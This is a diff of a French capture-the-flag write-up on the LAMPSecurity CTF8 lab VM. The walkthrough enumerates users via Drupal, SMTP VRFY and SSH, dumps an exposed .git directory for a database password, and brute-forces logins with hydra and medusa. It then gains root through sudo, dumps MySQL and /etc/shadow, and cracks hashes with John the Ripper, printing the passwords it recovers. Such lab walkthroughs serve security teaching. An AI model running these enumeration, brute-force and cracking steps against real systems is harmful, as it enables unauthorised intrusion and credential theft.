@@ -7,7 +7,7 @@ Lecture recommandée : [Walkthrough sur le challenge LAMPSecurity: CTF5](/CTF-Vu
 
 ## Recherche d'informations
 
-Comme pour les autres challenges LampSecurity, [netdiscover](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM LAMPSecurity CTF8.
+Comme pour les autres challenges LAMPSecurity, [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM LAMPSecurity CTF8.
 
 ```console
 root@blinils:~# netdiscover -r 192.168.56.0/24
@@ -23,7 +23,7 @@ _____________________________________________________________________________
 192.168.56.102  08:00:27:ad:1f:97      1      60  PCS Systemtechnik GmbH
 ```
 
-192.168.56.101 est l'adresse IP de ma machine virtuelle [Kali](https://docs.kali.org/introduction/what-is-kali-linux), tandis que 192.168.56.102 correspond à l'adresse IP de la VM LAMPSecurity CTF8. L'outil [nmap](https://nmap.org/book/man.html) est lancé en premier afin de détecter les ports ouverts sur le serveur CTF8, d'identifier les services installés et d'obtenir des informations sur le système d'exploitation.
+192.168.56.101 est l'adresse IP de ma machine virtuelle [Kali](https://docs.kali.org/introduction/what-is-kali-linux), tandis que 192.168.56.102 correspond à l'adresse IP de la VM LAMPSecurity CTF8. L'outil [__nmap__](https://nmap.org/book/man.html) est lancé en premier afin de détecter les ports ouverts sur le serveur CTF8, d'identifier les services installés et d'obtenir des informations sur le système d'exploitation.
 
 ```console
 root@blinils:~# nmap -sT -sV -p- 192.168.56.102
@@ -66,13 +66,13 @@ Shoot! Il y a beaucoup de ports ouverts sur cette machine... à première vue, i
 
 ![Affichage de l'image CTF8_user_view.png](images/CTF8_user_view.png)
 
-Le serveur Web semble a priori le plus alléchant pour commencer ; le site qu'il va falloir analyser de fond en comble est le blog de l'entreprise fictive LAMPSec Research. _LAMPSec Research is a leading edge commercial research and information analysis firm. We provide expert understanding of emerging trends to aid in the information security defensive capabilities of our clients. Our research labs investigate trending threats to provide measurable countermeasures to help keep our clients safe._
+Le serveur Web semble a priori le plus alléchant pour commencer ; le site qu'il va falloir analyser de fond en comble est le blog de l'entreprise fictive _LAMPSec Research_. _[It] is a leading edge commercial research and information analysis firm. We provide expert understanding of emerging trends to aid in the information security defensive capabilities of our clients. Our research labs investigate trending threats to provide measurable countermeasures to help keep our clients safe._
 
 ## À la recherche de comptes utilisateurs valides
 
-Plusieurs pages y ont été publiées en mars 2013, par deux utilisateurs : Barbara et Steve. En tout, les contacts de dix-neuf salariés de LAMPSec Research figurent dans les pages _executives_, _marketing_, _research_, _sales_ et _support_. Ces informations peuvent être récupérées manuellement, en parcourant tout le site Web : James Harraway, Steve Pinkton (_Executives_), Sherry Holden, Barbara Dio, Johnathan Alderman (_Marketing_), Dr. Harvey Plink, Jeff Grimes, Stacey Hunter, Juan Ingersol, Michael Swanson, Jerome Stone (_Research_), Gene Connor, Susan Swiney, Dan Hart, George Prune (_Sales_), John Goldman, Tom Maloney, Xavier Bruce et Sally Loreman (_Support_).
+Plusieurs pages y ont été publiées en mars 2013, par deux utilisateurs : ```Barbara``` et ```Steve```. En tout, les contacts de dix-neuf salariés de LAMPSec Research figurent dans les pages ```executives```, ```marketing```, ```research```, ```sales``` et ```support```. Ces informations peuvent être récupérées manuellement, en parcourant tout le site Web : James Harraway, Steve Pinkton (_Executives_), Sherry Holden, Barbara Dio, Johnathan Alderman (_Marketing_), Dr. Harvey Plink, Jeff Grimes, Stacey Hunter, Juan Ingersol, Michael Swanson, Jerome Stone (_Research_), Gene Connor, Susan Swiney, Dan Hart, George Prune (_Sales_), John Goldman, Tom Maloney, Xavier Bruce et Sally Loreman (_Support_).
 
-Le module _drupal_views_user_enum_ en liste deux de plus : Anonymous et admin.
+Le module ```drupal_views_user_enum``` en liste deux de plus : Anonymous et admin.
 
 ```console
 root@blinils:~# msfconsole --quiet
@@ -108,7 +108,7 @@ msf auxiliary(scanner/http/drupal_views_user_enum) > run
 
 ### SMTP User Enumeration (VRFY et EXPN)
 
-Et la cerise sur le gâteau : en fouillant un peu le site Web, il est possible de récupérer les adresses e-mail sur chacune des pages utilisateur, et d'obtenir ainsi des logins potentiels : jharraway, spinkton, sholden, bdio, jalderman, hplink, jgrimes, shunter, jingersol, mswanson, jstone, gconnor, sswiney, dhart, gprune, jgoldman, tmaloney, xbruce, sloreman. Hop, c'est sauvegardé dans un fichier texte pour une utilisation future.
+Et la cerise sur le gâteau : en fouillant un peu le site Web, il est possible de récupérer les adresses e-mail sur chacune des pages utilisateur, et d'obtenir ainsi des logins potentiels : ```jharraway```, ```spinkton```, ```sholden```, ```bdio```, ```jalderman```, ```hplink```, ```jgrimes```, ```shunter```, ```jingersol```, ```mswanson```, ```jstone```, ```gconnor```, ```sswiney```, ```dhart```, ```gprune```, ```jgoldman```, ```tmaloney```, ```xbruce```, ```sloreman```. Hop, c'est sauvegardé dans un fichier texte pour une utilisation future.
 
 ```console
 root@blinils:~# cat drupal_firstnames.txt
@@ -158,7 +158,7 @@ jharraway
 sswiney
 ```
 
-Il est possible de vérifier à l'aide du protocole SMTP si ces logins sont valides, et s'il s'agit de comptes Unix valides. En effet, [le protocole SMTP](https://tools.ietf.org/html/rfc821#page-9) embarque les commandes VRFY (Verify) et EXPN (Expand) qui, pour un compte utilisateur donné, vont respectivement vérifier si ce compte existe et s'il existe une liste de diffusion associée à ce compte utilisateur.
+Il est possible de vérifier à l'aide du protocole SMTP si ces logins sont valides, et s'il s'agit de comptes Unix valides. En effet, [le protocole SMTP](https://tools.ietf.org/html/rfc821#page-9) embarque les commandes ```VRFY``` (Verify) et ```EXPN``` (Expand) qui, pour un compte utilisateur donné, vont respectivement vérifier si ce compte existe et s'il existe une liste de diffusion associée à ce compte utilisateur.
 
 ```console
 root@blinils:~# telnet 192.168.56.102 25
@@ -177,7 +177,7 @@ quit
 Connection closed by foreign host.
 ```
 
-À l'aide du module Metasploit _[smtp_enum](https://www.offensive-security.com/metasploit-unleashed/scanner-smtp-auxiliary-modules/)_, il est possible de tester très rapidement si les comptes récupérés précédemment sont valides ou non.
+À l'aide du module __Metasploit__ [smtp_enum](https://www.offensive-security.com/metasploit-unleashed/scanner-smtp-auxiliary-modules/)_, il est possible de tester très rapidement si les comptes récupérés précédemment sont valides ou non.
 
 ```console
 msf > use auxiliary/scanner/smtp/smtp_enum
@@ -195,7 +195,7 @@ spinkton, sswiney, tmaloney, xbruce
 [*] Auxiliary module execution completed
 ```
 
-Ça marche aussi sans Metasploit, grâce au script [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) écrit en Perl, et même si le rendu n'est pas tip top.
+Ça marche aussi sans Metasploit, grâce au script [__smtp-user-enum__](https://github.com/pentestmonkey/smtp-user-enum) écrit en Perl, et même si le rendu n'est pas tip top.
 
 ```console
 root@blinils:~# perl smtp-user-enum.pl -M VRFY -U drupal_users.txt -t 192.168.56.102
@@ -270,7 +270,7 @@ jharraway is a valid user!
 sswiney is a valid user!
 ```
 
-Le module _ssh_enumusers_ confirme les résultats obtenus précédemment.
+Le module ```ssh_enumusers``` confirme les résultats obtenus précédemment.
 
 ```console
 root@blinils:~# msfconsole --quiet
@@ -312,12 +312,12 @@ msf auxiliary(scanner/ssh/ssh_enumusers) > run
 
 ## Dump du dépôt Git et extraction d'informations sensibles
 
-Poursuivons l'analyse du serveur Web : y a-t-il des répertoires « cachés » présents sur le site ? Pour le savoir, l'outil [DIRB](https://tools.kali.org/web-applications/dirb) va se servir d'une liste pré-établie de répertoires afin de déterminer l'arborescence du site. Il s'agit là d'une [attaque par dictionnaire](https://en.wikipedia.org/wiki/Password_cracking), a contrario d'une [attaque par bruteforce](https://en.wikipedia.org/wiki/Brute-force_attack) qui consisterait à tester, de manière exhaustive, toutes les combinaisons possibles : aa, ab, ac... zy zz aaa aab... zzy zzz aaaa aaab... et ainsi de suite. DIRB dispose d'un [large panel de dictionnaires](https://github.com/digination/dirbuster-ng/tree/master/wordlists), ainsi plusieurs résultats sont renvoyés avec le dictionnaire common.txt.
+Poursuivons l'analyse du serveur Web : y a-t-il des répertoires « cachés » présents sur le site ? Pour le savoir, l'outil [__DIRB__](https://tools.kali.org/web-applications/dirb) va se servir d'une liste pré-établie de répertoires afin de déterminer l'arborescence du site. Il s'agit là d'une [attaque par dictionnaire](https://en.wikipedia.org/wiki/Password_cracking), a contrario d'une [attaque par bruteforce](https://en.wikipedia.org/wiki/Brute-force_attack) qui consisterait à tester, de manière exhaustive, toutes les combinaisons possibles : aa, ab, ac... zy zz aaa aab... zzy zzz aaaa aaab... et ainsi de suite. DIRB dispose d'un [large panel de dictionnaires](https://github.com/digination/dirbuster-ng/tree/master/wordlists), ainsi plusieurs résultats sont renvoyés avec le dictionnaire common.txt.
 
 ```console
 root@blinils:~# dirb http://192.168.56.102
 
---snip--                      
+--snip--
 
 ---- Scanning URL: http://192.168.56.102/ ----
 + http://192.168.56.102/.git/HEAD (CODE:200|SIZE:23)
@@ -421,7 +421,7 @@ John Goldman (Ninja) <jgoldman@localhost.localdomain> 1370011345 -0400	commit (a
 John Goldman (Ninja) <jgoldman@localhost.localdomain> 1370013236 -0400	commit: initial commit
 ```
 
-Après une recherche éclair, on finit par retrouver sa trace dans le fichier _settings.php_ du site.
+Après une recherche éclair, on finit par retrouver sa trace dans le fichier ```settings.php``` du site.
 
 ```console
 root@blinils:~/git-dump/sites/default# cat settings.php | grep db_url
@@ -438,7 +438,7 @@ Malheureusement, ce mot de passe ne correspond à aucun compte Drupal ou login S
 
 ## À la recherche d'un mot de passe valide
 
-L'IHM d'administration est la première piste envisagée, et le compte _admin_ est bien évidemment le premier à être testé.
+L'IHM d'administration est la première piste envisagée, et le compte ```admin``` est bien évidemment le premier à être testé.
 
 ```console
 root@blinils:~# hydra -l admin -P rockyou.txt 192.168.56.102 http-form-post \
@@ -455,7 +455,7 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-11 10:09:08
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-Et hop, nous voici en possession du mot de passe _football123_. Avant de nous lancer dans la mise en place d'un _[reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)_ afin d'interagir avec le serveur, il est tout de même pertinent de vérifier si ce mot de passe n'est pas réutilisé ailleurs... pour des accès SSH au serveur, par exemple, ou pour d'autres accès à l'interface d'administration de Drupal ?
+Et hop, nous voici en possession du mot de passe ```football123``` pour le compte ```admin```. Avant de nous lancer dans la mise en place d'un [_reverse shell_](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) afin d'interagir avec le serveur, il est tout de même pertinent de vérifier si ce mot de passe n'est pas réutilisé ailleurs... pour des accès SSH au serveur, par exemple, ou pour d'autres accès à l'interface d'administration de Drupal ?
 
 ```console
 root@blinils:~# hydra -L drupal_firstnames.txt -p football123 192.168.56.102 http-form-post \
@@ -470,7 +470,7 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-11 11:10:09
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-Seul le compte admin a pour mot de passe _football123_. Quid des comptes SSH ?
+Seul le compte admin a pour mot de passe ```football123```. Quid des comptes SSH ?
 
 ```console
 root@blinils:~# medusa -h 192.168.56.102 -U drupal_users.txt -p football123 -M ssh
@@ -484,7 +484,7 @@ ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: jharraway (
 ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: sswiney (21 of 21, 20 complete) Password: football123 (1 of 1 complete)
 ```
 
-Bingo ! Il est possible de se connecter en SSH au serveur LampSecurity CTF8 avec les _credentials_ spinkton/football123.
+Bingo ! Il est possible de se connecter en SSH au serveur LAMPSecurity CTF8 avec les _credentials_ ```spinkton:football123```.
 
 ```console
 root@blinils:~# ssh spinkton@192.168.56.102
@@ -504,7 +504,7 @@ Last login: Thu Mar 27 12:48:29 2014 from 192.168.56.1
 uid=501(spinkton) gid=505(spinkton) groups=10(wheel),500(it),505(spinkton) --snip--
 ```
 
-Dommage, comme la plupart des autres VM, l'élévation de privilèges est un jeu d'enfant ; en effet, le compte spinkton [dispose de privilèges](https://doc.ubuntu-fr.org/sudoers) plutôt... permissifs et est autorisé à exécuter toutes les commandes via sudo. Il est alors possible de passer root avec la commandes ```sudo su``` ou ```sudo /bin/bash``` et le tour est joué. Cependant, le walkthrough est loin d'être terminé !
+Dommage, comme la plupart des autres VM, l'élévation de privilèges est un jeu d'enfant ; en effet, le compte spinkton [dispose de privilèges](https://doc.ubuntu-fr.org/sudoers) plutôt... permissifs et est autorisé à exécuter toutes les commandes via sudo. Il est alors possible de passer root avec la commandes ```sudo su``` ou ```sudo /bin/bash``` et le tour est joué. Cependant, le _walkthrough_ est loin d'être terminé !
 
 ```console
 [spinkton@localhost ~]$ sudo -l
@@ -519,7 +519,7 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 
 ## MySQL
 
-En effet, il y a encore la base de données MySQL à explorer et ce, à l'aide du mot de passe _JumpUpAndDown_ trouvé dans le répertoire .git.
+En effet, il y a encore la base de données MySQL à explorer et ce, à l'aide du mot de passe ```JumpUpAndDown``` trouvé dans le répertoire .git.
 
 ```console
 [spinkton@localhost ~]$ mysql -u root -p
@@ -597,7 +597,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-Des sites en ligne tels que [HashKiller](https://hashkiller.co.uk/md5-decrypter.aspx) ou [CrackStation](https://crackstation.net/) viennent compléter la liste des mots de passe Drupal récupérés.
+Des sites en ligne tels que [__HashKiller__](https://hashkiller.co.uk/md5-decrypter.aspx) ou [__CrackStation__](https://crackstation.net/) viennent compléter la liste des mots de passe Drupal récupérés.
 
 16/20 pour CrackStation !
 
@@ -665,8 +665,8 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-10 08:06:04
 
 ## Attaque par dictionnaire avec John The Ripper sur le fichier /etc/shadow
 
-Pour conclure ce _walkthrough_, intéressons-nous au fichier /etc/shadow. Celui-ci contient [les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes.
-L'outil John The Ripper est en mesure de [cracker les mots de passe Unix](https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html) si on lui fournit les fichiers /etc/passwd et /etc/shadow, comme suit...
+Pour conclure ce _walkthrough_, intéressons-nous au fichier ```/etc/shadow```. Celui-ci contient [les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes.
+L'outil __John The Ripper__ est en mesure de [cracker les mots de passe Unix](https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html) si on lui fournit les fichiers ```/etc/passwd``` et ```/etc/shadow```, comme suit...
 
 ```console
 [root@localhost ~]# cat /etc/shadow
@@ -730,7 +730,7 @@ xbruce:$1$BaCfmLl6$7k5Et1qS.SK3Xn5nggWT/.:15855:0:99999:7:::
 sloreman:$1$3pv2eOj7$RfwB4bpc4iMmEemCxlfdR0:15855:0:99999:7:::
 ```
 
-NB : pour faire le tri et obtenir uniquement les comptes avec les hashs en MD5, il est possible d'utiliser grep comme ceci.
+NB : pour faire le tri et obtenir uniquement les comptes avec les hashs en MD5, il est possible d'utiliser ```grep``` comme ceci.
 
 ```console
 [root@localhost ~]# cat /etc/shadow | grep '\$1\$' | head -n 3
@@ -773,7 +773,7 @@ sellsellsell     (sswiney)
 Use the "--show" option to display all of the cracked passwords reliably
 ```
 
-Seuls les mots de passe de jgoldman, de jingersol, de jstone et de xbruce résistent encore et toujours à l'envah\^W\^W John The Ripper.
+Seuls les mots de passe de ```jgoldman```, de ```jingersol```, de ```jstone``` et de ```xbruce``` résistent encore et toujours à l'envah\^W\^W John The Ripper.
 
 ```console
 root@blinils:~# john etccreds.db
@@ -799,7 +799,7 @@ xbruce:$1$BaCfmLl6$7k5Et1qS.SK3Xn5nggWT/.
 15 password hashes cracked, 4 left
 ```
 
-Encore un grand merci à [madirish2600](https://www.vulnhub.com/author/madirish2600,75/) pour avoir créé toutes ces chouettes VM LampSecurity ! Visiblement, la solution officielle proposée par l'auteur consiste à récupérer le cookie de session d'un profil administrateur Drupal, via une _Cross-Site Scripting_ dans le formulaire de contact. Une fois sur Drupal, un _[reverse shell](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/)_ doit alors être déposé pour prendre la main sur le serveur. Il est toujours intéressant de constater, tout comme les VM [Raven](/CTF-VulnLabs/raven2), que beaucoup de chemins mènent à root ! Peut-être y avait-il une autre possibilité d'exploitation, via les nombreuses connexions VNC au serveur trouvées lors du scan nmap ? Mystère.
+Encore un grand merci à [madirish2600](https://www.vulnhub.com/author/madirish2600,75/) pour avoir créé toutes ces chouettes VM LAMPSecurity ! Visiblement, la solution officielle proposée par l'auteur consiste à récupérer le cookie de session d'un profil administrateur Drupal, via une _Cross-Site Scripting_ dans le formulaire de contact. Une fois sur Drupal, un [_reverse shell_](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) doit alors être déposé pour prendre la main sur le serveur. Il est toujours intéressant de constater, tout comme les VM [Raven](/CTF-VulnLabs/raven2), que beaucoup de chemins mènent à root ! Peut-être y avait-il une autre possibilité d'exploitation, via les nombreuses connexions VNC au serveur trouvées lors du scan nmap ? Mystère.
 
 ## Bonus : les flags de LAMPSecurity: CTF8
 
